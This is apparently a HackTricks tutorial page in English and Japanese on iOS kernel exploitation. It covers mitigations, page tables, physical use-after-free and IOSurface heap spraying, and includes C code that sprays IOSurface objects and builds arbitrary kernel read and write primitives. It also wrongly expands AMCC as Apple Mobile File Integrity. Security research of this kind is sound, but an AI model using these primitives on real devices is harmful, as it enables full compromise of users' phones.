# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## iOS Exploit Mitigations

- **Code Signing** in iOS works by requiring every piece of executable code (apps, libraries, extensions, etc.) to be cryptographically signed with a certificate issued by Apple. When code is loaded, iOS verifies the digital signature against Apple’s trusted root. If the signature is invalid, missing, or modified, the OS refuses to run it. This prevents attackers from injecting malicious code into legitimate apps or running unsigned binaries, effectively stopping most exploit chains that rely on executing arbitrary or tampered code.
- **CoreTrust** is the iOS subsystem responsible for enforcing code signing at runtime. It directly verifies signatures using Apple’s root certificate without relying on cached trust stores, meaning only binaries signed by Apple (or with valid entitlements) can execute. CoreTrust ensures that even if an attacker tampers with an app after installation, modifies system libraries, or tries to load unsigned code, the system will block execution unless the code is still properly signed. This strict enforcement closes many post-exploitation vectors that older iOS versions allowed through weaker or bypassable signature checks.
- **Data Execution Prevention (DEP)** marks memory regions as non-executable unless they explicitly contain code. This stops attackers from injecting shellcode into data regions (like the stack or heap) and running it, forcing them to rely on more complex techniques like ROP (Return-Oriented Programming).
- **ASLR (Address Space Layout Randomization)** randomizes the memory addresses of code, libraries, stack, and heap every time the system runs. This makes it much harder for attackers to predict where useful instructions or gadgets are, breaking many exploit chains that depend on fixed memory layouts.
- **KASLR (Kernel ASLR)** applies the same randomization concept to the iOS kernel. By shuffling the kernel’s base address at each boot, it prevents attackers from reliably locating kernel functions or structures, raising the difficulty of kernel-level exploits that would otherwise gain full system control.
- **Kernel Patch Protection (KPP)** also known as **AMCC (Apple Mobile File Integrity)** in iOS, continuously monitors the kernel’s code pages to ensure they haven’t been modified. If any tampering is detected—such as an exploit trying to patch kernel functions or insert malicious code—the device will immediately panic and reboot. This protection makes persistent kernel exploits far harder, as attackers can’t simply hook or patch kernel instructions without triggering a system crash.
- **Kernel Text Readonly Region (KTRR)** is a hardware-based security feature introduced on iOS devices. It uses the CPU’s memory controller to mark the kernel’s code (text) section as permanently read-only after boot. Once locked, even the kernel itself cannot modify this memory region. This prevents attackers—and even privileged code—from patching kernel instructions at runtime, closing off a major class of exploits that relied on modifying kernel code directly.
- **Pointer Authentication Codes (PAC)** use cryptographic signatures embedded into unused bits of pointers to verify their integrity before use. When a pointer (like a return address or function pointer) is created, the CPU signs it with a secret key; before dereferencing, the CPU checks the signature. If the pointer was tampered with, the check fails and execution stops. This prevents attackers from forging or reusing corrupted pointers in memory corruption exploits, making techniques like ROP or JOP much harder to pull off reliably.
- **Privilege Access never (PAN)** is a hardware feature that prevents the kernel (privileged mode) from directly accessing user-space memory unless it explicitly enables access. This stops attackers who gained kernel code execution from easily reading or writing user memory to escalate exploits or steal sensitive data. By enforcing strict separation, PAN reduces the impact of kernel exploits and blocks many common privilege-escalation techniques.
- **Page Protection Layer (PPL)** is an iOS security mechanism that protects critical kernel-managed memory regions, especially those related to code signing and entitlements. It enforces strict write protections using the MMU (Memory Management Unit) and additional checks, ensuring that even privileged kernel code cannot arbitrarily modify sensitive pages. This prevents attackers who gain kernel-level execution from tampering with security-critical structures, making persistence and code-signing bypasses significantly harder.


## Physical use-after-free

This is a summary from the post from [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) moreover further information about exploit using this technique can be found in [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

ユーザプロセスの**仮想メモリ空間**は iOS では **0x0 から 0x8000000000** までに広がっています。しかし、これらのアドレスは物理メモリに直接対応しているわけではありません。代わりに、**カーネル**は **page tables** を使って仮想アドレスを実際の**物理アドレス**へ変換します。

#### Levels of Page Tables in iOS

Page table は階層構造で、3 レベルに分かれています:

1. **L1 Page Table (Level 1)**:
* ここにある各エントリは大きな仮想メモリ領域を表します。
* 1 エントリは **0x1000000000 バイト**（= **256 GB**）の仮想メモリをカバーします。
2. **L2 Page Table (Level 2)**:
* ここでのエントリはより小さな領域、具体的には **0x2000000 バイト**（= 32 MB）を表します。
* L1 のエントリは全体を直接マップできない場合、L2 テーブルを指すことがあります。
3. **L3 Page Table (Level 3)**:
* 最も細かいレベルで、各エントリが単一の **4 KB** ページをマップします。
* より細かい制御が必要な場合、L2 エントリは L3 テーブルを指すことがあります。

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* page table のいくつかのエントリは、仮想アドレスの範囲を連続する物理アドレスの範囲に直接**マップ**します（ショートカットのようなもの）。
* **Pointer to Child Page Table**:
* より細かい制御が必要な場合、あるレベルのエントリ（例えば L1）が次レベルの**子ページテーブル**（例えば L2）を指すことがあります。

#### Example: Mapping a Virtual Address

仮に仮想アドレス **0x1000000000** にアクセスしようとすると:

1. **L1 Table**:
* カーネルはこの仮想アドレスに対応する L1 エントリをチェックします。もし **L2 page table を指すポインタ**があれば、L2 テーブルへ進みます。
2. **L2 Table**:
* カーネルはより詳細なマッピングのために L2 エントリをチェックします。もしこのエントリが **L3 page table を指す**なら、さらに L3 へ進みます。
3. **L3 Table**:
* 最終的な L3 エントリを参照し、それが実際のメモリページの**物理アドレス**を指します。

#### Example of Address Mapping

もし L2 テーブルの最初のインデックスに物理アドレス **0x800004000** を書き込んだ場合:

* 仮想アドレス **0x1000000000** から **0x1002000000** までは、物理アドレス **0x800004000** から **0x802004000** へマップされます。
* これは L2 レベルでの**block mapping**です。

代わりに、L2 エントリが L3 テーブルを指す場合:

* 仮想アドレス範囲 **0x1000000000 -> 0x1002000000** の各 4 KB ページは L3 テーブルの個別のエントリによってマップされます。

### Physical use-after-free

「physical use-after-free (UAF)」は次のような状態が起きたときに発生します:

1. プロセスがあるメモリを **readable and writable** として **割り当てる**。
2. カーネルはそのメモリを特定の物理アドレスにアクセス可能としてマッピングするために **page tables** を更新する。
3. プロセスがそのメモリを **解放（free）** する。
4. しかし、バグによりカーネルは対応する物理メモリを **free とマークする** 一方で、page tables からそのマッピングを**削除し忘れる**。
5. カーネルはその「解放された」物理メモリを別の目的、例えば **カーネルデータ** のために **再割り当て** することができる。
6. マッピングが残っているため、プロセスはまだこの物理メモリを **read/write** できてしまう。

つまりプロセスは**カーネルメモリのページ**へアクセスできる状態になり得ます。そこには機密データや構造体が含まれている可能性があり、攻撃者にカーネルメモリを**操作**させることができます。

### IOSurface Heap Spray

攻撃者はどのカーネルページが解放されたメモリに割り当てられるかを制御できないため、次のような**heap spray** 技法を使います:

1. 攻撃者はカーネルメモリ内に多数の IOSurface オブジェクトを**作成**する。
2. 各 IOSurface オブジェクトは識別しやすい**magic value** をそのフィールドの一つに持たせておく。
3. 攻撃者は解放されたページを**スキャン**して、これらの IOSurface オブジェクトが解放ページに配置されていないか確認する。
4. 解放ページ上で IOSurface オブジェクトを見つけたら、それを使って**カーネルメモリの読み書き**が可能になる。

この手法の詳細は [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups) を参照してください。

> [!TIP]
> iOS 16+ (A12+) デバイスは PPL や SPTM のようなハードウェア緩和策を導入しており、physical UAF 手法をはるかに実行困難にしています。PPL は code signing、entitlements、機密なカーネルデータに関するページに対して厳格な MMU 保護を強制するため、たとえページが再利用されても userland や侵害されたカーネルコードからの書き込みはブロックされます。Secure Page Table Monitor (SPTM) は PPL を拡張し、ページテーブルの更新自体を強化します。これにより、特権カーネルコードであってもマッピングを黙って書き換えたり再マップしたりすることはできなくなります。KTRR はカーネルのコード領域をブート後に読み取り専用としてロックするため、物理 UAF エクスプロイトが依存しがちなランタイムでのコード修正を防ぎます。さらに、`IOSurface` の割り当ては予測しにくくなり、user-accessible な領域に入るのが難しくなっており、いわゆる「magic value スキャン」トリックの信頼性は低下しています。また `IOSurface` は現在 entitlements や sandbox 制限によっても保護されています。

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: 攻撃者は特別な識別子（"magic value"）を持つ多数の IOSurface オブジェクトを作成する。
2. **Scan Freed Pages**: 解放されたページの中にオブジェクトが割り当てられていないか確認する。
3. **Read/Write Kernel Memory**: IOSurface オブジェクトのフィールドを操作することで、カーネルメモリに対する **arbitrary reads and writes** を実現する。これにより:
* あるフィールドを使って **カーネルメモリ中の任意の 32-bit 値を読む** ことができる。
* 別のフィールドを使って **64-bit 値を書き込む** ことができ、安定した **kernel read/write primitive** を得られる。

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
解放された1つの物理ページ内で **`IOSurface`** オブジェクトを検索する:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### IOSurface を用いたカーネルの読み書き実現

kernel memory 内の IOSurface オブジェクトを制御できるようになった後（userspace からアクセス可能な freed physical page にマップされている状態）、それを **arbitrary kernel read and write operations** に利用できます。

**Key Fields in IOSurface**

IOSurface オブジェクトには重要なフィールドが二つあります:

1. **Use Count Pointer**: **32-bit read** を可能にします。
2. **Indexed Timestamp Pointer**: **64-bit write** を可能にします。

これらのポインタを書き換えることで、任意の kernel memory 上のアドレスにリダイレクトし、読み書きを可能にします。

#### 32-Bit Kernel Read

読み取りを行う手順:

1. **use count pointer** を上書きし、ターゲットアドレスから 0x14 バイト分引いたアドレスを指すようにします。
2. `get_use_count` メソッドを使用して、そのアドレスの値を読み取ります。
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

書き込みを行うには:

1. ターゲットアドレスに**indexed timestamp pointer**を上書きする。
2. `set_indexed_timestamp`メソッドを使って64ビット値を書き込む。
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### エクスプロイトの流れ（要約）

1. **Trigger Physical Use-After-Free**: 解放されたページが再利用可能になる。
2. **Spray IOSurface Objects**: カーネルメモリに一意の「magic value」を埋めた多数のIOSurfaceオブジェクトを割り当てる。
3. **Identify Accessible IOSurface**: 自分が制御する解放済みページ上のIOSurfaceを特定する。
4. **Abuse Use-After-Free**: IOSurfaceオブジェクト内のポインタを改ざんし、IOSurfaceのメソッド経由で任意の **kernel read/write** を可能にする。

これらのプリミティブにより、エクスプロイトはカーネルメモリに対する制御された **32-bit reads** と **64-bit writes** を提供する。さらに進んだ jailbreak のステップでは、より安定した read/write primitives が必要になる場合があり、追加の保護（例: 新しい arm64e デバイスでの PPL）を回避する必要がある。

{{#include ../../banners/hacktricks-training.md}}
